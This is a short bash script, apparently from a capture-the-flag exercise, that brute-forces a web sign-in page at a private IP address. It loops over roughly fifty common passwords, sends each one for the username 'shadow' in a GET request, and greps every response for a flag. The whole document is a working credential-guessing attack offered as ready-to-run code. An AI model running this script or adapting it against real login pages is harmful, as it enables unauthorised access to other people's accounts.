#!/bin/bash

passwords=(123456 password 123456789 12345678 12345 1234567 admin 123123 qwerty abc123 letmein monkey 111111 password1 qwerty123 dragon 1234 baseball iloveyou trustno1 sunshine princess football welcome shadow superman michael ninja mustang jessica charlie ashley bailey passw0rd master love hello freedom whatever nicole jordan cameron secret summer 1q2w3e4r zxcvbnm starwars computer taylor startrek)

for password in "${passwords[@]}"
do
    echo "Trying password: $password"
    
    curl -X GET "http://10.12.180.85/?page=signin&username=shadow&password=$password&Login=Login#" | grep flag
done